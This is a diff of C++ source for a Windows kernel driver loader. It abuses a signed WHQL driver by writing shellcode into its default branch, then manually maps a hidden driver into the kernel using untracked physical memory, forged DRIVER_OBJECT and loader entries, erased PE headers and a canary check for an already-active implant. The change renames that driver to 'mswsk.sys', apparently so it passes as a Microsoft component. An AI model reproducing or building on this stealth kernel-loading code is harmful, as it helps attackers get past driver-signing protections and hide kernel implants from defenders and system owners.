@@ -11,10 +11,10 @@
 //   2. 备份原始字节
 //   3. 构造 Shellcode：
 //      a. MmAllocatePagesForMdl → 分配游离物理内存 (零 PoolBigPageTable 痕迹)
-//      b. 物理写入 drv_wsk 展开镜像（通过用户态缓冲区物理地址）
+//      b. 物理写入 mswsk.sys 展开镜像（通过用户态缓冲区物理地址）
 //      c. 构造伪 DRIVER_OBJECT + KLDR_DATA_TABLE_ENTRY
 //      d. 挂入 PsLoadedModuleList
-//      e. 调用 drv_wsk DriverEntry
+//      e. 调用 mswsk.sys DriverEntry
 //      f. 恢复 WHQL default 分支原始字节
 //   4. 将 Shellcode 写入 WHQL 驱动 default 分支位置
 // ============================================================
@@ -368,7 +368,7 @@ static bool CheckDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase, uint3
         if (ReadKernelVA(hDev, cr3, drvBase + drvOrigSize, &canary, sizeof(canary))) {
             if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
                 LOG_OK("================================================================");
-                LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in host '%ls' extension area (offset +0x%X)!", drvName, drvOrigSize);
+                LOG_OK("[+] Core driver (mswsk) CANARY FOUND in host '%ls' extension area (offset +0x%X)!", drvName, drvOrigSize);
                 LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
                        canary.KernelImageVA, canary.ImageSize);
                 LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
@@ -399,7 +399,7 @@ static bool CheckDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase, uint3
                                 char sName[9] = {};
                                 memcpy(sName, s->Name, 8);
                                 LOG_OK("================================================================");
-                                LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in host '%ls' section '%s' (RVA=0x%X)!",
+                                LOG_OK("[+] Core driver (mswsk) CANARY FOUND in host '%ls' section '%s' (RVA=0x%X)!",
                                        drvName, sName, rva);
                                 LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
                                        secCanary.KernelImageVA, secCanary.ImageSize);
@@ -425,7 +425,7 @@ static bool CheckDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase, uint3
                     memcmp(&pProbe->Signature, &targetGuid, sizeof(GUID)) == 0)
                 {
                     LOG_OK("================================================================");
-                    LOG_OK("[+] Core driver (drv_wsk) HEADLESS CANARY FOUND in physical RAM (PA=0x%016llX)!", pa);
+                    LOG_OK("[+] Core driver (mswsk) HEADLESS CANARY FOUND in physical RAM (PA=0x%016llX)!", pa);
                     LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
                            pProbe->KernelImageVA, pProbe->ImageSize);
                     LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
@@ -472,7 +472,7 @@ static inline bool ClearDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase
 //   2. 获取 CR3 / KernBase / PsLoadedModuleList
 //   3. 检查内核物理暗桩（方案 1，避免重复加载）
 //   4. 扫描 default 分支特征码
-//   5. 读取并展开 drv_wsk.sys PE 镜像（manual map）
+//   5. 读取并展开 mswsk.sys PE 镜像（manual map）
 //   6. 修复重定位 + IAT
 //   7. 抹除 PE 头
 //   8. 锁定用户态展开镜像页并获取物理地址
@@ -914,7 +914,7 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
         return false;
     }
 
-    // ---- 5. 读取并展开 drv_wsk.sys ----
+    // ---- 5. 读取并展开 mswsk.sys ----
     auto rawBuf = ReadFile(drvWskPath);
     if (rawBuf.empty()) {
         LOG_ERR("LoadDrvWsk: Failed to read %ls", drvWskPath);
@@ -998,7 +998,7 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     }
 
     // ---- 9.2 分支 2B：宿主目标节区预备（零修改 PE 头，用户态 0 次物理写入）----
-    uint64_t payloadKernVA = 0; // drv_wsk 在宿主内部的目标内核 VA
+    uint64_t payloadKernVA = 0; // mswsk 在宿主内部的目标内核 VA
     uint64_t firstPtePA    = 0; // 目标节区首个 PTE 物理地址
 
     if (foundPref && chosenHostName) {
@@ -1085,7 +1085,7 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     if (!ioOk) {
         if (gle == ERROR_SHARING_VIOLATION || gle == 32) {
             LOG_OK("================================================================");
-            LOG_OK("[+] Core driver (drv_wsk) is ALREADY ACTIVE (Transport port conflict GLE=32)!");
+            LOG_OK("[+] Core driver (mswsk) is ALREADY ACTIVE (Transport port conflict GLE=32)!");
             LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
             LOG_OK("================================================================");
             CloseHandle(hDev);
@@ -1108,7 +1108,7 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     LOG_INFO("LoadDrvWsk: Core driver running successfully, unloading '%ls' tool driver...", triggerDrvName);
     UnloadWhqlDriver(triggerDrvName);
 
-    LOG_OK("LoadDrvWsk: drv_wsk mapped and initialized successfully (Host: %ls, Size: 0x%X)!",
+    LOG_OK("LoadDrvWsk: mswsk mapped and initialized successfully (Host: %ls, Size: 0x%X)!",
            actualHostName, hostDrvSize);
     return true;
 }
